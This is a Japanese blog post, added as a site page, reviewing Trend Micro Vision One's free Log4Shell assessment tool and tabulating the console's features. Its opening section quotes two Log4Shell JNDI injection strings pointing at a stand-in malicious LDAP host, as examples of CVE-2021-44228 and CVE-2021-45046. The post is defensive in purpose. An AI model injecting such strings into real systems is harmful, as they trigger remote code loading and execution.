@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="ja" nighteye="disabled"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Trend Micro Vision Oneを試してみる | Blahfe &amp; Grpr</title><meta name="description" content="Blahfe &amp; Grpr — IT・セキュリティコンサルティングとナレッジ">
+<link rel="icon" href="/assets/design/favicon.png"><link rel="canonical" href="https://blahfe.github.io/space/knowledge/blog/n127/"><link rel="stylesheet" href="/assets/design/refined.css?v=04e46e482591"><link rel="stylesheet" href="/assets/design/theme.css?v=c49b7396db3b"><link rel="stylesheet" href="/assets/design/components.css?v=fe7287a3b7da"><link rel="stylesheet" href="/assets/site.css?v=53239f992b91">
+<script src="/assets/site.js?v=8e404c97f2f6" defer></script></head><body><a class="skip" href="#rw_main_id">本文へ</a><div id="rw_wrapper" data-v-c819b962="" class="rw_background_partial rw_effects_popup_shadow rw_round_corners rw_header_spacious rw_theme_27164 rw_portal_styling"><div class="rw_structure" data-v-c819b962=""><div class="rw_banner" data-v-c819b962=""><img class="static-background static-banner-background" src="/assets/design/b6c3eab67b26eab3.png" alt="" aria-hidden="true" decoding="async"></div><div class="rw_full" data-v-c819b962=""></div><header id="rw_header" class="site-header">
+  <img class="header-background" src="/assets/design/b6c3eab67b26eab3.png" alt="" aria-hidden="true" decoding="async" fetchpriority="high">
+  <div class="site-header-inner">
+    <a class="site-brand" href="/" title="Blahfe &amp; Grpr">Blahfe &amp; Grpr</a>
+    <nav class="site-navigation" aria-label="メインメニュー">
+      <a href="/page/vision/">ビジョン</a>
+      <a href="/page/member/">メンバー</a>
+      <a href="/space/knowledge/">ナレッジ</a>
+      <a href="/page/contact/">コンタクト</a>
+    </nav>
+  </div>
+</header>
+<div id="rw_main" data-v-c819b962=""><div class="rw_bg_shadow" data-v-c819b962=""><div class="rw_shadow_container" data-v-c819b962="" style="width:85%"><div class="rw_shadow_left" data-v-c819b962=""></div><div class="rw_shadow_top" data-v-c819b962=""></div><div class="rw_shadow_right" data-v-c819b962=""></div></div></div><div id="rw_content" data-v-c819b962="" style="width:85%"><main id="rw_main_id" class="knowledge-article"><article><a class="breadcrumb" href="/space/knowledge/">ナレッジ</a><time class="article-date" datetime="2022-01-01">1 1月, 2022</time><h1>Trend Micro Vision Oneを試してみる</h1><details class="article-toc" open><summary>目次</summary><nav aria-label="この記事の目次"><div class="toc">
+<ul>
+<li><a href="#problem">PROBLEM</a></li>
+<li><a href="#solution">SOLUTION</a><ul>
+<li><a href="#log4jshell診断ツールを試してみる">Log4jShell診断ツールを試してみる</a></li>
+<li><a href="#他の機能を確認">他の機能を確認</a><ul>
+<li><a href="#security-posture">Security Posture</a></li>
+<li><a href="#assessment">Assessment</a></li>
+<li><a href="#threat-intelligence">Threat Intelligence</a></li>
+<li><a href="#xdredr">XDR（EDR）</a></li>
+<li><a href="#zero-trust-secure-access">Zero Trust Secure Access</a></li>
+<li><a href="#response-management">Response Management</a></li>
+<li><a href="#mobile-security">Mobile Security</a></li>
+<li><a href="#inventory-management">Inventory Management</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#wrapup">WRAPUP</a></li>
+</ul>
+</div>
+</nav></details><p>11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。</p>
+<p><img width="640" alt="thumbnail" src="/assets/blog/a40303f9b6ba5ae8.png"></p>
+<h2 id="problem">PROBLEM</h2>
+<ul>
+<li>11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている<ul>
+<li>JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（<a href="https://www.jpcert.or.jp/at/2021/at210050.html">CVE-2021-44228</a>）</li>
+<li>JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046）</li>
+</ul>
+</li>
+</ul>
+<h2 id="solution">SOLUTION</h2>
+<blockquote>
+<p>From: Trend Micro
+Subject: Log4Shell診断ツール ご提供開始</p>
+<p>Apache Log4j2ログ出力ライブラリの複数のバージョンに影響を与える深刻な脆弱性情報が公開されています。当診断ツールは、Log4Shellの影響を受ける可能性のあるエンドポイントとWebアプリケーションを特定することができます。また、攻撃対象領域の詳細を即座に可視化し、リスクを軽減するための措置をご案内いたします。</p>
+</blockquote>
+<p>と言うわけで、<a href="https://resources.trendmicro.com/Log4Shell-Vulnerability-Assessment_jp.html">Trend Micro Vision Oneの一部機能が無償で提供</a>されていたので確認します。Vision OneはSIEM、SOAR、EDR関連のツール。エンドポイント、サーバ、クラウド、メールおよびネットワーク全体を保護する各セキュリティ製品がセンサーとなり、各々のレイヤ―で検知した脅威や侵入の痕跡を、Threat Intelligenceを活用してサイバー攻撃の全体像を可視化します。</p>
+<h3 id="log4jshell診断ツールを試してみる">Log4jShell診断ツールを試してみる</h3>
+<ol>
+<li>Trend Micro Vision Oneにログイン</li>
+<li>[Log4Shell診断ツール]画面にてWindows/Mac/Linuxいずれかの診断ツールをダウンロード</li>
+<li>1分ほどで端末にインストールされ、詳細が確認できる</li>
+<li>自宅の端末で確認した結果はこちら<ul>
+<li><img width="1363.5" alt="image.png (124.0 kB)" src="/assets/blog/3162b0a64c549484.png"></li>
+</ul>
+</li>
+</ol>
+<p>ざっと試したところ数分程度でLog4Shellの診断を行う事ができました。Intune等EMMでの展開もそれほど難しくないように思います。</p>
+<h3 id="他の機能を確認">他の機能を確認</h3>
+<p>先ほど試したLog4Shell診断ツールはTrend Micro Vision OneのAssessmentカテゴリのいち機能になります。Vision OneはSecurity Postureによる方針策定、Assessment・Thread Intelligenceによる脅威検出、XDR（EDR）による脅威応答、Zero Trust Secure Access・Mobile Securityによる脅威防御、Inventory Managementによる脅威特定から構成されています。</p>
+<h4 id="security-posture">Security Posture</h4>
+<p>各種リスク、脅威を表示することで、セキュリティに関する心構えとともに方針策定のヒントを提示します。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Security Dashboard</td>
+<td>Company Risk Index、エンドポイントレポート、MITRE ATT&amp;CK MATRIXマップ</td>
+</tr>
+<tr>
+<td>Zero Trust Risk Insights</td>
+<td>アカウント侵害、脆弱性の検出、異常検出、クラウドアプリのアクティビティ、XDR検出、脅威検出</td>
+</tr>
+</tbody>
+</table>
+<h4 id="assessment">Assessment</h4>
+<p>各種端末に対して脅威検出等のセキュリティ評価を行います。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Targeted Attack Detection</td>
+<td>標的型攻撃の検出</td>
+</tr>
+<tr>
+<td>Security Assessment</td>
+<td>セキュリティ評価、Log4jの脆弱性検出</td>
+</tr>
+</tbody>
+</table>
+<h4 id="threat-intelligence">Threat Intelligence</h4>
+<p>内部および外部ソースを元に分析を行い環境内の潜在的な脅威を特定します。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Intelligence Reports</td>
+<td>内部および外部のソースからの最新のインテリジェンスレポートを統合して、環境内の潜在的な脅威を特定</td>
+</tr>
+<tr>
+<td>Suspicous Object Management</td>
+<td>特定の疑わしいオブジェクトを検出した後に実行する接続製品のアクションを指定できます</td>
+</tr>
+<tr>
+<td>Sandbox Analysis</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h4 id="xdredr">XDR（EDR）</h4>
+<p>検出モデルと応答サービスを管理します。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Detection Model Management</td>
+<td>検出モデルの管理</td>
+</tr>
+<tr>
+<td>Workbench</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Observed Attack Techniques</td>
+<td>観察された攻撃手法</td>
+</tr>
+<tr>
+<td>Managed XDR</td>
+<td>マネージドXDRは検出および応答の代行サービス</td>
+</tr>
+</tbody>
+</table>
+<h4 id="zero-trust-secure-access">Zero Trust Secure Access</h4>
+<p>各種アクセス制御を管理します。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Secure Access Overview</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Secure Access Rules</td>
+<td>IAM、ログイン制御</td>
+</tr>
+<tr>
+<td>Access Control History</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Private Access Configuration</td>
+<td>プライベートアクセス制御</td>
+</tr>
+<tr>
+<td>Internet Access Configuration</td>
+<td>インターネットアクセス制御</td>
+</tr>
+</tbody>
+</table>
+<h4 id="response-management">Response Management</h4>
+<p>応答サービスを管理するものだと思いますが、XDR（EDR）との区別がよく分かりません。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Response Management</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="mobile-security">Mobile Security</h4>
+<p>モバイル端末に特化したセキュリティ機能、検出ログや管理ポリシーを扱います。EMM連携も可能です。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mobile Detection Logs</td>
+<td>モバイル端末検出ログ</td>
+</tr>
+<tr>
+<td>Mobile Policy</td>
+<td>モバイル端末管理ポリシー</td>
+</tr>
+<tr>
+<td>Risky Mobile Apps</td>
+<td>MDMとの統合機能</td>
+</tr>
+</tbody>
+</table>
+<h4 id="inventory-management">Inventory Management</h4>
+<p>各種リソースの一覧表になります。</p>
+<table>
+<thead>
+<tr>
+<th>function</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Endpoint Inventory</td>
+<td>エンドポイント端末一覧表</td>
+</tr>
+<tr>
+<td>Email Account Inventory</td>
+<td>Eメールアカウント一覧表</td>
+</tr>
+<tr>
+<td>Network Inventory</td>
+<td>ネットワーク一覧表</td>
+</tr>
+<tr>
+<td>Service Gateway Inventory</td>
+<td>サービスゲートウェイ一覧表</td>
+</tr>
+<tr>
+<td>Mobile Inventory</td>
+<td>モバイル端末一覧表</td>
+</tr>
+</tbody>
+</table>
+<h2 id="wrapup">WRAPUP</h2>
+<p>Trend Micro Vision Oneについて、各機能の使い勝手は分かりませんが、EDRを軸にセキュリティ機能を固めているようです。EDRについては完全自動化というのは無理でしょうから、どのくらいサポートがあるかで製品の価値がかわってくるものと思います。Log4Shell診断ツールの使い勝手は分かりましたが、コンソール画面上の他の機能を見る限りどの程度便利かはよく分かりませんでした。</p></article></main></div></div><footer aria-busy="false" aria-live="polite" class="footer" data-v-6b503e4a="" data-v-c819b962="" id="footer_layout" style="position: relative;"><div class="footer_wrapper" data-v-04dbce04="" data-v-6b503e4a=""><div aria-busy="false" aria-live="polite" class="" data-v-04dbce04="" data-v-7f42c21d="" data-v-app="" id="ld_render" style="position: relative;"><div class="render_desktop" id="rw_layout_app"><div class="le_layout"><div class="le_sections"><div class="le_entity le_section" style="background-color: rgb(219, 224, 218);"><div class="le_entity_content le_entity_width_inherit le_section_spacing_tight" style="--element-text-colour: #707070; --element-title-colour: #111111;"><div class="le_rows"><div class="le_entity le_row" style="--v5c4b44f6: ;"><div class="le_entity_content le_entity_spacing_tight le_content_alignment_start le_entity_height_fit-module"><div class="le_columns le_entity_spacing_custom le_entity_height_fit-module"><div class="le_entity le_column render_desktop" style="flex-basis: 100%; width: 100%;"><div class="le_entity_content le_entity_spacing_tight le_entity_height_fit-module"><div class="le_modules le_entity_spacing_tight le_entity_height_fit-module"><div class="le_entity le_module" style="background-color: transparent;" tabindex="-1"><div class="le_entity_content le_entity_spacing_tight le_element_spacing_default le_entity_height_fit-module le_entity_element_alignment_left le_entity_element_alignment_vertical_center le_module_render_class text Paragraph" tabindex="-1"><div class="le_module_contents"><div class="le_module_column" style="flex-basis: 100%;"><div class="le_element le_element_type_text"><div class="element-text-preview" style="text-align: left;"><p style="text-align: center;"><span style="color: rgba(0, 0, 0, 0.7);"><span>© Blhafe &amp; Grpr. All rights reserved.</span></span></p></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div class="more_menu" data-v-04dbce04=""></div></div></footer>
+</div></div></body></html>
